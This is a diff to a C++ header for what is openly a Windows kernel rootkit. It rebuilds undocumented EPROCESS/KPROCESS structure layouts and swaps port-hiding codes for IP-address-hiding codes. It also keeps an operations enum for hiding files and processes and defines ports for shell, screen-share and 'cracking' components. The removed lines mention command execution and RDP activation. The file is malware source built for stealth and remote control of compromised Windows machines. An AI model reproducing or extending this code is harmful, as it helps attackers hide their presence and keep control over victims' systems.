@@ -4,7 +4,12 @@
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 #include <Windows.h>
 #include <iostream>
+#include <cstdio>
 #define REGULAR_BUFFER_WRITE "regular"
+#define TARGET_WEBSERVER 8050
+#define TARGET_SHELL 8060
+#define TARGET_SCREENSHARE 8070
+#define TARGET_CRACKING 8090
 #pragma comment(lib, "Ws2_32.lib")
 
 typedef struct _UNICODE_STRING {
@@ -22,9 +27,160 @@ REQUIRED DEFINITIONS:
 */
 
 
+#define EX_PUSH_LOCK ULONG_PTR
+
+typedef struct _EX_RUNDOWN_REF {
+
+#define EX_RUNDOWN_ACTIVE      0x1
+#define EX_RUNDOWN_COUNT_SHIFT 0x1
+#define EX_RUNDOWN_COUNT_INC   (1<<EX_RUNDOWN_COUNT_SHIFT)
+
+	union {
+		__volatile ULONG_PTR Count;
+		__volatile PVOID Ptr;
+	};
+} EX_RUNDOWN_REF, * PEX_RUNDOWN_REF;
+
+typedef struct _EX_FAST_REF {
+	PVOID Object;
+} EX_FAST_REF, * PEX_FAST_REF;
+
+typedef struct _RTL_BALANCED_NODE {
+	union {
+		struct _RTL_BALANCED_NODE* Children[2];
+		struct {
+			struct _RTL_BALANCED_NODE* Left;
+			struct _RTL_BALANCED_NODE* Right;
+		} DUMMYSTRUCTNAME;
+	} DUMMYUNIONNAME;
+
+#define RTL_BALANCED_NODE_RESERVED_PARENT_MASK 3
+
+	union {
+		UCHAR Red : 1;
+		UCHAR Balance : 2;
+		ULONG_PTR ParentValue;
+	} DUMMYUNIONNAME2;
+} RTL_BALANCED_NODE, * PRTL_BALANCED_NODE;
+
+typedef struct _RTL_AVL_TREE {
+	RTL_BALANCED_NODE* Root;
+} RTL_AVL_TREE, * PRTL_AVL_TREE;
+
+typedef struct _PS_DYNAMIC_ENFORCED_ADDRESS_RANGES {
+	RTL_AVL_TREE Tree;
+	EX_PUSH_LOCK Lock;
+} PS_DYNAMIC_ENFORCED_ADDRESS_RANGES, * PPS_DYNAMIC_ENFORCED_ADDRESS_RANGES;
+
+typedef struct _KAFFINITY_EX {
+	char Affinity[0xA8];
+} KAFFINITY_EX, * PKAFFINITY_EX;
+
+typedef struct _KSTACK_COUNT {
+	ULONG State;
+	ULONG StackCount;
+} KSTACK_COUNT, * PKSTACK_COUNT;
+
+typedef struct _MMSUPPORT_FLAGS {
+	/*
+	0x000 WorkingSetType   : Pos 0, 3 Bits
+		+ 0x000 Reserved0 : Pos 3, 3 Bits
+		+ 0x000 MaximumWorkingSetHard : Pos 6, 1 Bit
+		+ 0x000 MinimumWorkingSetHard : Pos 7, 1 Bit
+		+ 0x001 SessionMaster : Pos 0, 1 Bit
+		+ 0x001 TrimmerState : Pos 1, 2 Bits
+		+ 0x001 Reserved : Pos 3, 1 Bit
+		+ 0x001 PageStealers : Pos 4, 4 Bits
+		*/
+	USHORT u1;
+	UCHAR MemoryPriority;
+	/*
+	+ 0x003 WsleDeleted : Pos 0, 1 Bit
+	+ 0x003 SvmEnabled : Pos 1, 1 Bit
+	+ 0x003 ForceAge : Pos 2, 1 Bit
+	+ 0x003 ForceTrim : Pos 3, 1 Bit
+	+ 0x003 NewMaximum : Pos 4, 1 Bit
+	+ 0x003 CommitReleaseState : Pos 5, 2 Bits
+	*/
+	UCHAR u2;
+}MMSUPPORT_FLAGS, * PMMSUPPORT_FLAGS;
+
+typedef struct _MMSUPPORT_INSTANCE {
+	UINT NextPageColor;
+	UINT PageFaultCount;
+	UINT64 TrimmedPageCount;
+	PVOID VmWorkingSetList;
+	LIST_ENTRY WorkingSetExpansionLinks;
+	UINT64 AgeDistribution[8];
+	PVOID ExitOutswapGate;
+	UINT64 MinimumWorkingSetSize;
+	UINT64 WorkingSetLeafSize;
+	UINT64 WorkingSetLeafPrivateSize;
+	UINT64 WorkingSetSize;
+	UINT64 WorkingSetPrivateSize;
+	UINT64 MaximumWorkingSetSize;
+	UINT64 PeakWorkingSetSize;
+	UINT HardFaultCount;
+	USHORT LastTrimStamp;
+	USHORT PartitionId;
+	UINT64 SelfmapLock;
+	MMSUPPORT_FLAGS Flags;
+} MMSUPPORT_INSTANCE, * PMMSUPPORT_INSTANCE;
+
+typedef struct _MMSUPPORT_SHARED {
+	long WorkingSetLock;
+	long GoodCitizenWaiting;
+	UINT64 ReleasedCommitDebt;
+	UINT64 ResetPagesRepurposedCount;
+	PVOID WsSwapSupport;
+	PVOID CommitReleaseContext;
+	PVOID AccessLog;
+	UINT64 ChargedWslePages;
+	UINT64 ActualWslePages;
+	UINT64 WorkingSetCoreLock;
+	PVOID ShadowMapping;
+} MMSUPPORT_SHARED, * PMMSUPPORT_SHARED;
+
+typedef struct _MMSUPPORT_FULL {
+	MMSUPPORT_INSTANCE Instance;
+	MMSUPPORT_SHARED Shared;
+	UCHAR Padding[48];
+} MMSUPPORT_FULL, * PMMSUPPORT_FULL;
+
+typedef struct _ALPC_PROCESS_CONTEXT {
+	char AlpcContext[0x20];
+} ALPC_PROCESS_CONTEXT, * PALPC_PROCESS_CONTEXT;
+
+typedef struct _JOBOBJECT_WAKE_FILTER {
+	UINT HighEdgeFilter;
+	UINT LowEdgeFilter;
+} JOBOBJECT_WAKE_FILTER, * PJOBOBJECT_WAKE_FILTER;
+
+typedef struct _PS_PROCESS_WAKE_INFORMATION {
+	UINT64 NotificationChannel;
+	UINT WakeCounters[7];
+	JOBOBJECT_WAKE_FILTER WakeFilter;
+	UINT NoWakeCounter;
+} PS_PROCESS_WAKE_INFORMATION, * PPS_PROCESS_WAKE_INFORMATION;
+
+typedef struct _PS_PROTECTION
+{
+	union
+	{
+		UCHAR Level;                                                        //0x0
+		struct
+		{
+			UCHAR Type : 3;                                                   //0x0
+			UCHAR Audit : 1;                                                  //0x0
+			UCHAR Signer : 4;                                                 //0x0
+		};
+	};
+} PS_PROTECTION, * PPS_PROTECTION;
+
 #define TIMER_TOLERABLE_DELAY_BITS      6
 #define TIMER_EXPIRED_INDEX_BITS        6
 #define TIMER_PROCESSOR_INDEX_BITS      5
+
 typedef struct _DISPATCHER_HEADER {
 	union {
 		union {
@@ -166,55 +322,9 @@ typedef struct _DISPATCHER_HEADER {
 	LIST_ENTRY WaitListHead;            // Object lock
 } DISPATCHER_HEADER, * PDISPATCHER_HEADER;
 
-typedef struct _KAFFINITY_EX {
-	char Affinity[0xA8];
-} KAFFINITY_EX, * PKAFFINITY_EX;
-
-typedef struct _KSTACK_COUNT {
-	char Affinity[4];
-} KSTACK_COUNT, * PKSTACK_COUNT;
-
-typedef struct _EX_RUNDOWN_REF {
-
-#define EX_RUNDOWN_ACTIVE      0x1
-#define EX_RUNDOWN_COUNT_SHIFT 0x1
-#define EX_RUNDOWN_COUNT_INC   (1<<EX_RUNDOWN_COUNT_SHIFT)
-
-	union {
-		__volatile ULONG_PTR Count;
-		__volatile PVOID Ptr;
-	};
-} EX_RUNDOWN_REF, * PEX_RUNDOWN_REF;
-
-typedef struct _MMSUPPORT_FULL {
-	char Vm[0x110];
-} MMSUPPORT_FULL, *PMMSUPPORT_FULL;
-
-typedef struct _ALPC_PROCESS_CONTEXT{
-	char AlpcContext[0x20];
-} ALPC_PROCESS_CONTEXT, * PALPC_PROCESS_CONTEXT;
-
-typedef struct _PS_PROCESS_WAKE_INFORMATION {
-	char WakeInfo[0x30];
-} PS_PROCESS_WAKE_INFORMATION, * PPS_PROCESS_WAKE_INFORMATION;
-
 typedef struct _WNF_STATE_NAME {
 	ULONG Data[2];
-} WNF_STATE_NAME, *PWNF_STATE_NAME;
-
-typedef struct _PS_PROTECTION
-{
-	union
-	{
-		UCHAR Level;                                                        //0x0
-		struct
-		{
-			UCHAR Type : 3;                                                   //0x0
-			UCHAR Audit : 1;                                                  //0x0
-			UCHAR Signer : 4;                                                 //0x0
-		};
-	};
-} PS_PROTECTION, *PPS_PROTECTION;
+} WNF_STATE_NAME;
 
 
 // Internal EPROCESS/KPROCESS of 1809:
@@ -227,9 +337,11 @@ typedef struct _ACTKPROCESS {
 	UINT ProcessTimerDelay;
 	UINT64 DeepFreezeStartTime;
 	KAFFINITY_EX Affinity;
+	UINT64 AffinityPadding[12];
 	LIST_ENTRY ReadyListHead;
 	SINGLE_LIST_ENTRY SwapListEntry;
 	KAFFINITY_EX ActiveProcessors;
+	UINT64 ActiveProcessorsPadding[12];
 	/*
    AutoAlignment    : Pos 0; 1 Bit
    DisableBoost     : Pos 1; 1 Bit
@@ -244,12 +356,17 @@ typedef struct _ACTKPROCESS {
    ReservedFlags    : Pos 31; 1 Bit
 	*/
 	int ProcessFlags;
+	int ActiveGroupsMask;
 	char BasePriority;
 	char QuantumReset;
 	char Visited;
 	char Flags;
-	UINT ThreadSeed[20];
+	USHORT ThreadSeed[20];
+	USHORT ThreadSeedPadding[12];
+	USHORT IdealProcessor[20];
+	USHORT IdealProcessorPadding[12];
 	USHORT IdealNode[20];
+	USHORT IdealNodePadding[12];
 	USHORT IdealGlobalNode;
 	USHORT Spare1;
 	KSTACK_COUNT StackCount;
@@ -263,14 +380,17 @@ typedef struct _ACTKPROCESS {
 	UINT ReadyTime;
 	UINT64 UserDirectoryTableBase;
 	UCHAR AddressPolicy;
-	UCHAR Spare [71];
+	UCHAR Spare[71];
 	PVOID InstrumentationCallback;
 	PVOID SecureState;
-} ACTKPROCESS, *PACTKPROCESS;
+	PVOID KernelWaitTime;
+	PVOID UserWaitTime;
+	UINT64 EndPadding[8];
+} ACTKPROCESS, * PACTKPROCESS;
 
 typedef struct _ACTEPROCESS {
 	ACTKPROCESS Pcb;
-	ULONG_PTR ProcessLock;
+	EX_PUSH_LOCK ProcessLock;
 	PVOID UniqueProcessId;
 	LIST_ENTRY ActiveProcessLinks;
 	EX_RUNDOWN_REF RundownProtect;
@@ -344,10 +464,10 @@ typedef struct _ACTEPROCESS {
 	UINT64 VirtualSize;
 	LIST_ENTRY SessionProcessLinks;
 	PVOID ExceptionPortData;  // also defined as UINT64 ExceptionPortValue;
-    /*
+	/*
 + 0x350 ExceptionPortState : Pos 0, 3 Bits
 */
-	ULONG64 Token;
+	EX_FAST_REF Token;
 	UINT64 MmReserved;
 	ULONG_PTR AddressCreationLock;
 	ULONG_PTR PageTableCommitmentLock;
@@ -365,7 +485,6 @@ typedef struct _ACTEPROCESS {
 	PVOID WorkingSetWatch;
 	PVOID Win32WindowStation;
 	PVOID InheritedFromUniqueProcessId;
-	PVOID Spare0;
 	UINT64 OwnerProcessId;
 	PVOID Peb;
 	PVOID Session;
@@ -389,7 +508,7 @@ typedef struct _ACTEPROCESS {
 	UINT ImagePathHash;
 	UINT DefaultHardErrorProcessing;
 	int LastThreadExitStatus;
-	ULONG64 PrefetchTrace;
+	EX_FAST_REF PrefetchTrace;
 	PVOID LockedPagesList;
 	LARGE_INTEGER ReadOperationCount;
 	LARGE_INTEGER WriteOperationCount;
@@ -399,70 +518,83 @@ typedef struct _ACTEPROCESS {
 	LARGE_INTEGER OtherTransferCount;
 	UINT64 CommitChargeLimit;
 	UINT64 CommitCharge;
-	UINT64 CommitChargePeak;
+	UCHAR CommitChargePeak[48];
 	MMSUPPORT_FULL Vm;
 	LIST_ENTRY MmProcessLinks;
 	UINT ModifiedPageCount;
 	int ExitStatus;
-	ULONG64 VadRoot;
+	RTL_AVL_TREE VadRoot;
 	PVOID VadHint;
 	UINT64 VadCount;
 	UINT64 VadPhysicalPages;
 	UINT64 VadPhysicalPagesLimit;
 	ALPC_PROCESS_CONTEXT AlpcContext;
+
 	LIST_ENTRY TimerResolutionLink;
 	PVOID TimerResolutionStackRecord;
 	UINT RequestedTimerResolution;
 	UINT SmallestTimerResolution;
 	LARGE_INTEGER ExitTime;
 	PVOID InvertedFunctionTable;
-	ULONG_PTR InvertedFunctionTableLock;
+	EX_PUSH_LOCK InvertedFunctionTableLock;
 	UINT ActiveThreadsHighWatermark;
 	UINT LargePrivateVadCount;
-	ULONG_PTR ThreadListLock;
+	EX_PUSH_LOCK ThreadListLock;
 	PVOID WnfContext;
 	PVOID ServerSilo;
 	UCHAR SignatureLevel;
 	UCHAR SectionSignatureLevel;
 	PS_PROTECTION Protection;
-	UINT Flags3;
-	/*
-+ 0x6cc Minimal : Pos 0, 1 Bit
-		+ 0x6cc ReplacingPageRoot : Pos 1, 1 Bit
-		+ 0x6cc Crashed : Pos 2, 1 Bit
-		+ 0x6cc JobVadsAreTracked : Pos 3, 1 Bit
-		+ 0x6cc VadTrackingDisabled : Pos 4, 1 Bit
-		+ 0x6cc AuxiliaryProcess : Pos 5, 1 Bit
-		+ 0x6cc SubsystemProcess : Pos 6, 1 Bit
-		+ 0x6cc IndirectCpuSets : Pos 7, 1 Bit
-		+ 0x6cc RelinquishedCommit : Pos 8, 1 Bit
-		+ 0x6cc HighGraphicsPriority : Pos 9, 1 Bit
-		+ 0x6cc CommitFailLogged : Pos 10, 1 Bit
-		+ 0x6cc ReserveFailLogged : Pos 11, 1 Bit
-		+ 0x6cc SystemProcess : Pos 12, 1 Bit
-		+ 0x6cc HideImageBaseAddresses : Pos 13, 1 Bit
-		+ 0x6cc AddressPolicyFrozen : Pos 14, 1 Bit
-		+ 0x6cc ProcessFirstResume : Pos 15, 1 Bit
-		+ 0x6cc ForegroundExternal : Pos 16, 1 Bit
-		+ 0x6cc ForegroundSystem : Pos 17, 1 Bit
-		+ 0x6cc HighMemoryPriority : Pos 18, 1 Bit
-		+ 0x6cc EnableProcessSuspendResumeLogging : Pos 19, 1 Bit
-		+ 0x6cc EnableThreadSuspendResumeLogging : Pos 20, 1 Bit
-		+ 0x6cc SecurityDomainChanged : Pos 21, 1 Bit
-		+ 0x6cc SecurityFreezeComplete : Pos 22, 1 Bit
-		+ 0x6cc VmProcessorHost : Pos 23, 1 Bit
-		*/
+	union {
+		UCHAR HangCount;
+		UCHAR GhostCount;
+		UCHAR PrefilterException;
+	};
+	union {
+		UINT Flags3;
+		UINT Minimal;
+		UINT ReplacingPageRoot;
+		UINT Crashed;
+		UINT JobVadsAreTracked;
+		UINT VadTrackingDisabled;
+		UINT AuxiliaryProcess;
+		UINT SubsystemProcess;
+		UINT IndirectCpuSets;
+		UINT RelinquishedCommit;
+		UINT HighGraphicsPriority;
+		UINT CommitFailLogged;
+		UINT ReserveFailLogged;
+		UINT SystemProcess;
+		UINT HideImageBaseAddresses;
+		UINT AddressPolicyFrozen;
+		UINT ProcessFirstResume;
+		UINT ForegroundExternal;
+		UINT ForegroundSystem;
+		UINT HighMemoryPriority;
+		UINT EnableProcessSuspendResumeLogging;
+		UINT EnableThreadSuspendResumeLogging;
+		UINT SecurityDomainChanged;
+		UINT SecurityFreezeComplete;
+		UINT VmProcessorHost;
+		UINT VmProcessorHostTransition;
+		UINT AltSyscall;
+		UINT TimerResolutionIgnore;
+		UINT DisallowUserTerminate;
+	};
+
 	INT64 DeviceAsid;
 	PVOID SvmData;
-	ULONG_PTR SvmProcessLock;
+	EX_PUSH_LOCK SvmProcessLock;
 	UINT64 SvmLock;
+
 	LIST_ENTRY SvmProcessDeviceListHead;
 	UINT64 LastFreezeInterruptTime;
 	PVOID DiskCounters;
 	PVOID PicoContext;
 	PVOID EnclaveTable;
 	UINT64 EnclaveNumber;
-	ULONG_PTR EnclaveLock;
+	EX_PUSH_LOCK EnclaveLock;
+
 	UINT64 HighPriorityFaultsAllowed;
 	PVOID EnergyContext;
 	PVOID VmContext;
@@ -471,16 +603,25 @@ typedef struct _ACTEPROCESS {
 	UINT64 CreateUnbiasedInterruptTime;
 	UINT64 TotalUnbiasedFrozenTime;
 	UINT64 LastAppStateUpdateTime;
-	ULONG64 LastAppState;
-	/*
-		+ 0x770 LastAppStateUptime : Pos 0, 61 Bits
-		+ 0x770 LastAppState : Pos 61, 3 Bits
-		*/
+
+	union {
+		ULONG64 LastAppStateUptime;
+		ULONG64 LastAppState;
+	};
+
 	UINT64 SharedCommitCharge;
-	ULONG_PTR SharedCommitLock;
+	EX_PUSH_LOCK SharedCommitLock;
 	LIST_ENTRY SharedCommitLinks;
-	UINT64 AllowedCpuSets;  // Can also be AllowedCpuSetsIndirect (PVOID)
-	UINT64 DefaultCpuSets;  // Can also be DefaultCpuSetsIndirect (PVOID)
+
+	union {
+		UINT64 AllowedCpuSets;
+		UINT64 AllowedCpuSetsIndirect;
+	};
+	union {
+		UINT64 DefaultCpuSets;
+		UINT64 DefaultCpuSetsIndirect;
+	};
+
 	PVOID DiskIoAttribution;
 	PVOID DxgProcess;
 	UINT64 Win32KFilterSet;
@@ -489,16 +630,39 @@ typedef struct _ACTEPROCESS {
 	UINT KTimer2Sets;
 	UINT64 ThreadTimerSets;
 	UINT64 VirtualTimerListLock;
+
+
 	LIST_ENTRY VirtualTimerListHead;
-	PS_PROCESS_WAKE_INFORMATION WakeInfo;  // Can also be WakeChannel (WNF_STATE_NAME)
-	UINT MitigationFlags;
-	UINT MitigationFlags2;
+	union {
+		WNF_STATE_NAME WakeChannel;
+		PS_PROCESS_WAKE_INFORMATION WakeInfo;
+	};
+
+	union {
+		UINT MitigationFlags;
+		UINT MitigationFlagsValues;
+	};
+
+	union {
+		UINT MitigationFlags2;
+		UINT MitigationFlags2Values;
+	};
 	PVOID PartitionObject;
 	UINT64 SecurityDomain;
 	UINT64 ParentSecurityDomain;
 	PVOID CoverageSamplerContext;
 	PVOID MmHotPatchContext;
-} ACTEPROCESS, *PACTEPROCESS;
+	RTL_AVL_TREE DynamicEHContinuationTargetsTree;
+	EX_PUSH_LOCK DynamicEHContinuationTargetsLock;
+	PS_DYNAMIC_ENFORCED_ADDRESS_RANGES DynamicEnforcedCetCompatibleRanges;
+	UINT64 DisabledComponentFlags;
+	UINT64 PathRedirectionHashes;
+
+	union {
+		ULONG MitigationFlags3[4];
+		ULONG MitigationFlags3Values[4];
+	};
+} ACTEPROCESS, * PACTEPROCESS;
 
 typedef struct _SHORTENEDACTEPROCESS {
 	PVOID UniqueProcessId;
@@ -518,7 +682,7 @@ typedef struct _SHORTENEDACTEPROCESS {
 	LARGE_INTEGER WriteOperationCount;
 	LARGE_INTEGER OtherOperationCount;
 	int ExitStatus;
-} SHORTENEDACTEPROCESS, *PSHORTENEDACTEPROCESS;
+} SHORTENEDACTEPROCESS, * PSHORTENEDACTEPROCESS;
 
 
 // Definitions of file hiding values:
@@ -536,13 +700,13 @@ typedef struct _SHORTENEDACTEPROCESS {
 #define HideProcess 0xCDCDCDCDDCDCDCDC
 #define ListHiddenProcesses 0x0D0D0D0DD0D0D0D0
 
-#define UNHIDE_PORT ((NTSTATUS)0xC00000C3L)  // Code used by client/medium for unhiding ports
-#define HIDE_PORT ((NTSTATUS)0xC00000D6L)  // Code used by client/medium for hiding ports
-#define SHOWHIDDEN_PORTS ((NTSTATUS)0xC00000E4L)  // Code used by client/medium for listing hidden ports
-#define REMOVE_BY_INDEX_PORT 47
-#define UnhidePort 0xC0C0C0C00C0C0C0C
-#define HidePort 0xCDCDCDCDDCDCDCDC
-#define ListHiddenPorts 0x0D0D0D0DD0D0D0D0
+#define UNHIDE_ADDR ((NTSTATUS)0xC00000C3L)  // Code used by client/medium for unhiding IP addresses
+#define HIDE_ADDR ((NTSTATUS)0xC00000D6L)  // Code used by client/medium for hiding IP addresses
+#define SHOWHIDDEN_ADDRS ((NTSTATUS)0xC00000E4L)  // Code used by client/medium for listing hidden IP addresses
+#define REMOVE_BY_INDEX_ADDR 0xFFFFFFFF
+#define UnhideAddress 0xC0C0C0C00C0C0C0C
+#define HideAddress 0xCDCDCDCDDCDCDCDC
+#define ListHiddenAddresses 0x0D0D0D0DD0D0D0D0
 #define DEFAULT_MEDIUM_PORT 44444
 
 #define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
@@ -737,11 +901,7 @@ typedef enum _ROOTKIT_OPERATION {
 	RKOP_PRCMALLOC = 0xB00000AF,
 	RKOP_HIDEFILE = 0xB00000BF,
 	RKOP_HIDEPROC = 0xB00000CF,
-	RKOP_HIDEPORT = 0xB00000DF,
-
-	RKOP_GETFILE = 0xB00000EF,
-	RKOP_EXECOMMAND = 0xB00000FF,
-	RKOP_ACTIVATERDP = 0xB0000100,
+	RKOP_HIDEADDR = 0xB00000DF,
 
 	RKOP_NOOPERATION = 0xB0000101,
 	RKOP_TERMINATE = 0xB0000102,
